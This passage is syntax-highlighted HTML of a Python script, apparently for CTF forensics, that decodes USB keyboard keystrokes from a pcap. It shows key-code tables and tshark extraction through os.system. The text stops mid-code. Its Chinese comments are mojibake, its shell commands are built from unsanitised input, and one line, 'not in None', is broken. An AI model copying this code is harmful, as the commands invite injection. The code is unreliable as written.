punctuation\">:</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"21\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"22\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"5\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"23\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"24\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"25\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"26\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"27\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"28\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;RET>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;ESC>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;DEL>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;SPACE>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"[\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"30\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"]\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"31\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\\\\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"32\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;NON>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"33\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"34\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"35\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;GA>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"36\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"37\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"38\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"39\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F1>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F2>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F3>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F4>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F5>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F6>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"40\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F7>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"41\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F8>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"42\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F9>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"43\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F10>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"44\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F11>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"45\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F12>\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#Press shift </span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        self<span class=\"token punctuation\">.</span>shiftKeys <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"04\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"05\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"B\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"06\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"C\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"07\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"D\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"08\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"E\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"09\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"F\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"G\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"H\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"I\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"J\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"K\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"L\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"10\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"M\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"11\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"N\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"12\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"O\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"13\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"P\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"14\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Q\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"15\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"R\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"16\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"S\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"17\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"T\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"18\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"U\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"19\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"V\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"W\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"X\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Y\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Z\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"!\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"@\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"20\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"21\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"$\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"22\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"%\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"23\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"^\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"24\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&amp;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"25\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"26\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"(\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"27\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\")\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"28\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;RET>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;ESC>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;DEL>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;SPACE>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"_\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"+\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&#123;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"30\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"31\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"|\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"32\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;NON>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"33\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\\\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"34\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"35\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;GA>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"36\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"37\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"38\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"39\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F1>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F2>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F3>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F4>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F5>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F6>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"40\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F7>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"41\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F8>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"42\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F9>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"43\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F10>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"44\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F11>\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"45\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;F12>\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">tshark_do</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> pcapfile<span class=\"token punctuation\">,</span> filterfield<span class=\"token punctuation\">,</span> fieldvalue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"nt\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span> filterfield <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -Y </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filterfield<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tsharkæ‰§è¡Œè¯­å¥ï¼š\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tsharkå¯¼å‡ºæ•°æ®æˆåŠŸ\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tsharkæ‰§è¡Œè¯­å¥ï¼š\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tsharkå¯¼å‡ºæ•°æ®å¤±è´¥\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">elif</span> os<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"posix\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token comment\">#sed '/^\\s*$/d' ä¸»è¦æ˜¯å»æ‰ç©ºè¡Œ</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">if</span> filterfield <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -Y </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filterfield<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> | sed '/^\\s*$/d' > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> | sed '/^\\s*$/d' > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tsharkæ‰§è¡Œè¯­å¥ï¼š\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tsharkå¯¼å‡ºæ•°æ®æˆåŠŸ\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tsharkæ‰§è¡Œè¯­å¥ï¼š\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tsharkå¯¼å‡ºæ•°æ®å¤±è´¥\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\">#ç­›æ‰æ— ç”¨æ•°æ®ï¼Œæ”¹å˜æ•°æ®æ ¼å¼</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">formatkbdata</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        formatfile <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"formatKbdatafile.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                <span class=\"token comment\"># if len(i.strip(\"\\n\")) == 8:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token comment\">#     Bytes = [i[j:j+2] for j in range(0, len(i.strip(\"\\n\")), 2)]</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token comment\">#     data = \":\".join(Bytes)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token comment\">#     formatfile.writelines(data+\"\\n\")</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                    Bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">:</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                    data <span class=\"token operator\">=</span> <span class=\"token string\">\":\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                    formatfile<span class=\"token punctuation\">.</span>writelines<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        formatfile<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">jiemi</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n-----å¼€å§‹è§£å¯†Tsharkå¯¼å‡ºçš„é”®ç›˜æ•°æ®-----\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token comment\"># è¯»å–æ•°æ® z</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"formatKbdatafile.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                self<span class=\"token punctuation\">.</span>presses<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#å»æ‰æœ«å°¾çš„ \\n</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token comment\"># å¼€å§‹å¤„ç†</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        result <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">for</span> press <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>presses<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">if</span> press <span class=\"token operator\">==</span> <span class=\"token string\">''</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>            <span class=\"token comment\">#thark ç‰ˆæœ¬åŸå› ï¼Œå¯¼å‡ºæ•°æ®æ ¼å¼ä¸åŒ</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">':'</span> <span class=\"token keyword\">in</span> press<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                Bytes <span class=\"token operator\">=</span> press<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                <span class=\"token comment\">#ä¸¤ä¸¤åˆ†ç»„</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                Bytes <span 